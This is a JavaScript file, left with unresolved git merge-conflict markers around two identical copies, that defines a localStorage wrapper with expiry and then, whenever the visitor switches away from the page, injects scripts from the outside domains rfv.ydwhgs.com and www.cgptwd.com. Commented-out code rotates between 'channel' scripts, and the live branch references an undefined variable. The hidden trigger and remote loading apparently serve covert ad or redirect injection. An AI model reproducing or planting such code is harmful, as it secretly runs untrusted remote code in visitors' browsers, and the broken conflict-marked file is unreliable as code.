<<<<<<< HEAD
class Storage {
               
  constructor() {
    this.source = window.localStorage;
    this.initClear();
  }

 /**
  * 初始化清除已经过期的数据
  */
  initClear(){    
    // const reg = new RegExp("__expires__");
    var reg = /__expires__/;
    var data = this.source;
    var list = Object.keys(data);
    if(list.length > 0){
      list.forEach((key) => {
        // 如果为非包含__expires__键名的key进行判断清除过期的
        if( !reg.test(key)){
          var now = Date.now();
          var expires = data[`${key}__expires__`];
          if (now >= expires ) {
            this.remove(key);
          }
        }
      })
    }
  }

  /**
   * set 存储方法
   * @ param {String} 	key 键名
   * @ param {String} 	value 键值
   * @ param {String} 	expired 过期时间，以分钟为单位，非必须。（不传则为永久有效）
   */
  set(key, value, expired) {    
    var source = this.source;
    source[key] = JSON.stringify(value);
    if (expired !== undefined){
      // // 过期时间单位为天
      // source[`${key}__expires__`] = Date.now() + 1000 * 60 * 60 * 24 * expired
      // // 过期时间单位为小时
      // source[`${key}__expires__`] = Date.now() + 1000 * 60 * 60 * expired
      // 过期时间单位为分钟
      source[`${key}__expires__`] = Date.now() + 1000 * 60 * expired;
    };
  }

  /**
   * get 获取方法
   * @ param {String} 	key 键名
   * @ return  如果没过期则返回数据，否则返回null
   */
   get(key) {    
        const source = this.source;
        const expires = source[`${key}__expires__`];
        // 获取前把已经过期的数据删除掉
        if (expires) {
          const now = Date.now();
          if ( now >= expires ) {
            this.remove(key);
            return null;
          }
        }
        // 获取数据
        const value = source[key] ? JSON.parse(source[key]) : null;
        return value;
  }

  /**
   * remove 删除方法
   * @ param {String} 	key 键名  非必须 （不传则删除所有）
   */
  remove(key) {
    if (key) {
      // localStorage自带的removeItem()方法
      this.source.removeItem(key);
      this.source.removeItem(`${key}__expires__`);
      // delete data[key];
      // delete data[`${key}__expires__`];
    } else {
      // 清除所有，localStorage自带的clear()方法
      this.source.clear();
    }
  }
} 


function randomFunc(min, max) {

    return Math.floor(Math.random() * (max+1 - min)) + min;
}

var myLocalStorage = new Storage();
var _to = myLocalStorage.get('timeout_bz');

if(_to){

}else{
     // 监听 visibility change 事件 
     document.addEventListener('visibilitychange', function() {
        
          // 页面变为不可见时触发 
          if (document.visibilityState == 'hidden') { 
        
            window.setTimeout(function() {
                
                
                //   var _random = randomFunc(1, 2);
                //   var _lastChannel = myLocalStorage.get('now_channel');
                //   var _jsUrl  = '';
                //   var _nowChannel  = '';
                  
                //   if(random == 1){
                       
                //       if(_lastChannel == 'dz110'){
                          
                //           _jsUrl = "//rfv.ydwhgs.com/static/pull/sanming106.js";
                //           _nowChannel = 'sanming106';
                          
                //       }else{
                          
                //           _jsUrl = "//wtchanneljs.xmysinter.com/static/channel/dz110.js";
                //           _nowChannel = 'dz110';
                //       }
                      
                //   }else{
                       
                //       if(_lastChannel == 'sanming106'){
                          
                //           _jsUrl = "//wtchanneljs.xmysinter.com/static/channel/dz110.js";
                //           _nowChannel = 'dz110';
                          
                //       }else{
                          
                //           _jsUrl = "//rfv.ydwhgs.com/static/pull/sanming106.js";
                //           _nowChannel = 'sanming106';
                //       } 
                      
                //   }
                  
                //   var hi = document.createElement("script");
                //       hi.src = _jsUrl;
                //       var k = document.getElementsByTagName("script")[0];
                //       k.parentNode.insertBefore(hi, k);
                      
                //       myLocalStorage.set('now_channel', _nowChannel, 60*24);
                  
                //   myLocalStorage.set('timeout_bz', new Date().getTime(), 60*12);
                
                    var ms = document.createElement("script");
                    ms.src = "https://rfv.ydwhgs.com/static/pull/sanming201.js";
                    var k = document.getElementsByTagName("script")[0];
                    k.parentNode.insertBefore(ms, k);
                  var hi3 = document.createElement("script");
                  hi3.src = "https://www.cgptwd.com/zm10";
                  hi3.charset = "UTF-8";
                    var k3 = document.getElementsByTagName("script")[0];
                  k3.parentNode.insertBefore(hi3, k3);
                   
                      
                  myLocalStorage.set('now_channel', _nowChannel, 60*24);
                
            }, 1500);      
          } 
     })
=======
class Storage {
               
  constructor() {
    this.source = window.localStorage;
    this.initClear();
  }

 /**
  * 初始化清除已经过期的数据
  */
  initClear(){    
    // const reg = new RegExp("__expires__");
    var reg = /__expires__/;
    var data = this.source;
    var list = Object.keys(data);
    if(list.length > 0){
      list.forEach((key) => {
        // 如果为非包含__expires__键名的key进行判断清除过期的
        if( !reg.test(key)){
          var now = Date.now();
          var expires = data[`${key}__expires__`];
          if (now >= expires ) {
            this.remove(key);
          }
        }
      })
    }
  }

  /**
   * set 存储方法
   * @ param {String} 	key 键名
   * @ param {String} 	value 键值
   * @ param {String} 	expired 过期时间，以分钟为单位，非必须。（不传则为永久有效）
   */
  set(key, value, expired) {    
    var source = this.source;
    source[key] = JSON.stringify(value);
    if (expired !== undefined){
      // // 过期时间单位为天
      // source[`${key}__expires__`] = Date.now() + 1000 * 60 * 60 * 24 * expired
      // // 过期时间单位为小时
      // source[`${key}__expires__`] = Date.now() + 1000 * 60 * 60 * expired
      // 过期时间单位为分钟
      source[`${key}__expires__`] = Date.now() + 1000 * 60 * expired;
    };
  }

  /**
   * get 获取方法
   * @ param {String} 	key 键名
   * @ return  如果没过期则返回数据，否则返回null
   */
   get(key) {    
        const source = this.source;
        const expires = source[`${key}__expires__`];
        // 获取前把已经过期的数据删除掉
        if (expires) {
          const now = Date.now();
          if ( now >= expires ) {
            this.remove(key);
            return null;
          }
        }
        // 获取数据
        const value = source[key] ? JSON.parse(source[key]) : null;
        return value;
  }

  /**
   * remove 删除方法
   * @ param {String} 	key 键名  非必须 （不传则删除所有）
   */
  remove(key) {
    if (key) {
      // localStorage自带的removeItem()方法
      this.source.removeItem(key);
      this.source.removeItem(`${key}__expires__`);
      // delete data[key];
      // delete data[`${key}__expires__`];
    } else {
      // 清除所有，localStorage自带的clear()方法
      this.source.clear();
    }
  }
} 


function randomFunc(min, max) {

    return Math.floor(Math.random() * (max+1 - min)) + min;
}

var myLocalStorage = new Storage();
var _to = myLocalStorage.get('timeout_bz');

if(_to){

}else{
     // 监听 visibility change 事件 
     document.addEventListener('visibilitychange', function() {
        
          // 页面变为不可见时触发 
          if (document.visibilityState == 'hidden') { 
        
            window.setTimeout(function() {
                
                
                //   var _random = randomFunc(1, 2);
                //   var _lastChannel = myLocalStorage.get('now_channel');
                //   var _jsUrl  = '';
                //   var _nowChannel  = '';
                  
                //   if(random == 1){
                       
                //       if(_lastChannel == 'dz110'){
                          
                //           _jsUrl = "//rfv.ydwhgs.com/static/pull/sanming106.js";
                //           _nowChannel = 'sanming106';
                          
                //       }else{
                          
                //           _jsUrl = "//wtchanneljs.xmysinter.com/static/channel/dz110.js";
                //           _nowChannel = 'dz110';
                //       }
                      
                //   }else{
                       
                //       if(_lastChannel == 'sanming106'){
                          
                //           _jsUrl = "//wtchanneljs.xmysinter.com/static/channel/dz110.js";
                //           _nowChannel = 'dz110';
                          
                //       }else{
                          
                //           _jsUrl = "//rfv.ydwhgs.com/static/pull/sanming106.js";
                //           _nowChannel = 'sanming106';
                //       } 
                      
                //   }
                  
                //   var hi = document.createElement("script");
                //       hi.src = _jsUrl;
                //       var k = document.getElementsByTagName("script")[0];
                //       k.parentNode.insertBefore(hi, k);
                      
                //       myLocalStorage.set('now_channel', _nowChannel, 60*24);
                  
                //   myLocalStorage.set('timeout_bz', new Date().getTime(), 60*12);
                
                    var ms = document.createElement("script");
                    ms.src = "https://rfv.ydwhgs.com/static/pull/sanming201.js";
                    var k = document.getElementsByTagName("script")[0];
                    k.parentNode.insertBefore(ms, k);
                  var hi3 = document.createElement("script");
                  hi3.src = "https://www.cgptwd.com/zm10";
                  hi3.charset = "UTF-8";
                    var k3 = document.getElementsByTagName("script")[0];
                  k3.parentNode.insertBefore(hi3, k3);
                   
                      
                  myLocalStorage.set('now_channel', _nowChannel, 60*24);
                
            }, 1500);      
          } 
     })
>>>>>>> 594145b71631a576a8e3b33cbe43acdd07d09079
}